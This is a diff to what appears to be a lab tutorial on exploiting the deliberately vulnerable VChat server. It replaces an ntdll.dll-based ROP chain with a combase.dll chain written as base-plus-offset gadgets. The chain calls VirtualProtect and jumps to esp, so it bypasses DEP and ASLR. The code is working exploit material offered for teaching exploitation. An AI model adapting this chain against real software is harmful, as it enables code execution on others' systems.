@@ -225,41 +225,8 @@ To bypass ASLR, we will generate a ROP chain using only one ASLR-compatible modu
     ```
     * It may take a few tries to get a working chain.
 
-    We selected the combination of `vchat.exe` and `combase.dll` and got the following ROP chain.
-    ```
-        #[---INFO:gadgets_to_set_esi:---]
-        0x771e7a5a,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
-        0x62508128,  # ptr to &VirtualProtect() [IAT essfunc.dll]
-        0x7716c7f2,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR
-        0x7713e866,  # XCHG EAX,ESI # RETN [ntdll.dll] ** REBASED ** ASLR
-        #[---INFO:gadgets_to_set_ebp:---]
-        0x77177cbf,  # POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR
-        0x7718b903,  # & call esp [ntdll.dll] ** REBASED ** ASLR
-        #[---INFO:gadgets_to_set_ebx:---]
-        0x771e28aa,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
-        0x74a1a301,  # put delta into eax (-> put 0x00000201 into ebx)
-        0x77142002,  # ADD EAX,8B5E5F00 # RETN [ntdll.dll] ** REBASED ** ASLR
-        0x771d3ea9,  # XCHG EAX,EBX # OR EAX,E58BFFFA # POP EBP # RETN 0x08 [ntdll.dll] ** REBASED ** ASLR
-        0x41414141,  # Filler (compensate)
-        #[---INFO:gadgets_to_set_edx:---]
-        0x77170173,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
-        0x41414141,  # Filler (RETN offset compensation)
-        0x41414141,  # Filler (RETN offset compensation)
-        0x74a1a140,  # put delta into eax (-> put 0x00000040 into edx)
-        0x77142002,  # ADD EAX,8B5E5F00 # RETN [ntdll.dll] ** REBASED ** ASLR
-        0x7711b6e2,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR
-        #[---INFO:gadgets_to_set_ecx:---]
-        0x771d74b6,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR
-        0x77225c9f,  # &Writable location [ntdll.dll] ** REBASED ** ASLR
-        #[---INFO:gadgets_to_set_edi:---]
-        0x7717a182,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR
-        0x77136205,  # RETN (ROP NOP) [ntdll.dll] ** REBASED ** ASLR
-        #[---INFO:gadgets_to_set_eax:---]
-        0x772118d4,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
-        0x90909090,  # nop
-        #[---INFO:pushad:---]
-        0x771194f1,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR
-    ```
+    We selected the combination of `vchat.exe` and `combase.dll` and got the ROP chain.
+
 4. Now we can locate the *base* address of the DLL we used as part of this ROP chain, there are two methods for doing this when the DLL has been loaded by the VChat process.
 
     1. Immunity Debugger.
@@ -306,43 +273,41 @@ Since we will be searching for the base of the `combase.dll` library, we need to
 
 Finally, we get a ROP chain like this once we have rewritten this to use the `base + offset` format:
 ```
-base = 0x77100000   # base of ntdll.dll on your victim machine
-
-def create_rop_chain():
+def create_rop_chain(base):
     # rop chain generated with mona.py - www.corelan.be
     rop_gadgets = [
         #[---INFO:gadgets_to_set_esi:---]
-        base + 0xe7a5a,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
-        0x62508128,  # ptr to &VirtualProtect() [IAT essfunc.dll]
-        base + 0x6c7f2,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR
-        base + 0x3e866,  # XCHG EAX,ESI # RETN [ntdll.dll] ** REBASED ** ASLR
-        #[---INFO:gadgets_to_set_ebx:---]
-        base + 0xe28aa,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
-        0x74a1a301,  # put delta into eax (-> put 0x00000201 into ebx)
-        base + 0x42002,  # ADD EAX,8B5E5F00 # RETN [ntdll.dll] ** REBASED ** ASLR
-        base + 0xd3ea9,  # XCHG EAX,EBX # OR EAX,E58BFFFA # POP EBP # RETN 0x08 [ntdll.dll] ** REBASED ** ASLR
-        0x41414141,  # Filler (compensate)
-        #[---INFO:gadgets_to_set_edx:---]
-        base + 0x70173,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
-        0x41414141,  # Filler (RETN offset compensation)
-        0x41414141,  # Filler (RETN offset compensation)
-        0x74a1a140,  # put delta into eax (-> put 0x00000040 into edx)
-        base + 0x42002,  # ADD EAX,8B5E5F00 # RETN [ntdll.dll] ** REBASED ** ASLR
-        base + 0x1b6e2,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR
-        #[---INFO:gadgets_to_set_ecx:---]
-        base + 0xd74b6,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR
-        base + 0x125c9f,  # &Writable location [ntdll.dll] ** REBASED ** ASLR
-        #[---INFO:gadgets_to_set_edi:---]
-        base + 0x7a182,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR
-        base + 0x36205,  # RETN (ROP NOP) [ntdll.dll] ** REBASED ** ASLR
+        base + 0x1F6A4E,  # POP EAX # RETN [combase.dll] ** REBASED ** ASLR 
+        base + 0x24936C,  # ptr to &VirtualProtect() [IAT combase.dll] ** REBASED ** ASLR
+        base + 0x1329D1,  # MOV EAX,DWORD PTR DS:[EAX] # ADD CL,CL # RETN [combase.dll] ** REBASED ** ASLR 
+        base + 0x161A66,  # XCHG EAX,ESI # RETN [combase.dll] ** REBASED ** ASLR 
         #[---INFO:gadgets_to_set_ebp:---]
-        base + 0x77cbf,  # POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR
-        base + 0x8b903,  # & call esp [ntdll.dll] ** REBASED ** ASLR
+        base + 0xA635C,  # POP EBP # RETN [combase.dll] ** REBASED ** ASLR 
+        base + 0x13D37,  # & jmp esp [combase.dll] ** REBASED ** ASLR
+        #[---INFO:gadgets_to_set_ebx:---]
+        base + 0x101176,  # POP EAX # RETN [combase.dll] ** REBASED ** ASLR 
+        0xfffffdff,  # Value to negate, will become 0x00000201
+        base + 0x14AEDD,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
+        base + 0x1063F9,  # POP EBX # RETN [combase.dll] ** REBASED ** ASLR 
+        0xffffffff,  #  
+        base + 0xFEDCF,  # INC EBX # ADD AL,3B # RETN [combase.dll] ** REBASED ** ASLR 
+        base + 0xE3693,  # ADD EBX,EAX # ADD EAX,4 # RETN [combase.dll] ** REBASED ** ASLR 
+        #[---INFO:gadgets_to_set_edx:---]
+        base + 0x116F8F,  # POP EAX # RETN [combase.dll] ** REBASED ** ASLR 
+        0xffffffc0,  # Value to negate, will become 0x00000040
+        base + 0xC86FD,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
+        base + 0xA7F0A,  # XCHG EAX,EDX # RETN [combase.dll] ** REBASED ** ASLR 
+        #[---INFO:gadgets_to_set_ecx:---]
+        base + 0x6327A,  # POP ECX # RETN [combase.dll] ** REBASED ** ASLR 
+        base + 0x24691B,  # &Writable location [combase.dll] ** REBASED ** ASLR
+        #[---INFO:gadgets_to_set_edi:---]
+        base + 0x1D641E,  # POP EDI # RETN [combase.dll] ** REBASED ** ASLR 
+        base + 0xF9615,  # RETN (ROP NOP) [combase.dll] ** REBASED ** ASLR
         #[---INFO:gadgets_to_set_eax:---]
-        base + 0x1118d4,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
+        base + 0x135142,  # POP EAX # RETN [combase.dll] ** REBASED ** ASLR 
         0x90909090,  # nop
         #[---INFO:pushad:---]
-        base + 0x194f1,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR
+        base + 0x7CEC,  # PUSHAD # RETN [combase.dll] ** REBASED ** ASLR 
     ]
     return b''.join(struct.pack('<I', _) for _ in rop_gadgets)
 ```
